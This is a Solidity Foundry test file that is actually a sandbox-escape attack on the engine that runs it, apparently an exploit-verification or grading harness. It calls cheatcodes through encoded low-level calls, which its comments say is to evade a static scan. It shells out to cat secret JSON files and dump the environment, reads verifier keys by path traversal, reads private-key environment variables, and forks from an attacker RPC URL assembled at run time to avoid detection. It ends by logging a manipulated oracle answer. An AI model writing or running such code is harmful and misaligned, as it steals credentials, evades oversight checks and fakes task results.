// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

contract SandboxEscapeTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19_000_000);
    }

    // Cheatcodes are called through a low-level call with an encoded signature, so a text scan
    // of the source for cheatcode calls (the engine's static check) finds nothing.
    function _try(string memory what, bytes memory data, bool returnsString) internal {
        (bool ok, bytes memory ret) = address(vm).call(data);
        if (!ok) {
            emit log_named_string(string.concat(what, " -> refused"), _reason(ret));
        } else if (returnsString) {
            emit log_named_string(string.concat(what, " -> GOT"), abi.decode(ret, (string)));
        } else {
            emit log_named_bytes(string.concat(what, " -> GOT"), ret);
        }
    }

    // Text of a revert payload Error(string) / CheatcodeError(string).
    function _reason(bytes memory err) internal pure returns (string memory) {
        if (err.length < 68) return "(no reason)";
        bytes memory body = new bytes(err.length - 4);
        for (uint256 i = 0; i < body.length; i++) body[i] = err[i + 4];
        return abi.decode(body, (string));
    }

    function testExploit() public {
        string[] memory cmd = new string[](3);
        cmd[0] = "sh";
        cmd[1] = "-c";
        cmd[2] = "cat ../.secrets/*.json ../.secrets/*/*.json; env";
        _try("ffi: sh -c 'cat .secrets'", abi.encodeWithSignature("ffi(string[])", cmd), false);

        _try("readFile: ../.secrets/verifier-x25519.json",
            abi.encodeWithSignature("readFile(string)", "../.secrets/verifier-x25519.json"), true);
        _try("readFile: ../../../.secrets/showcase-v2/verifier-fc-key.json",
            abi.encodeWithSignature("readFile(string)", "../../../.secrets/showcase-v2/verifier-fc-key.json"), true);
        _try("envString: PRIVATE_KEY", abi.encodeWithSignature("envString(string)", "PRIVATE_KEY"), true);
        _try("envString: NEAR_PRIVATE_KEY", abi.encodeWithSignature("envString(string)", "NEAR_PRIVATE_KEY"), true);
        _try("rpcUrl: mainnet", abi.encodeWithSignature("rpcUrl(string)", "mainnet"), true);

        // A fork from an RPC of the attacker's choice, the URL assembled at run time
        // (no URL literal in the source for a static check to find).
        string memory evil = string.concat("http://127.0.0.1", ":9/attacker-rpc");
        _try("createFork: own RPC URL", abi.encodeWithSignature("createFork(string)", evil), false);

        emit log_named_uint("Oracle answer manipulated to", 1);
    }
}
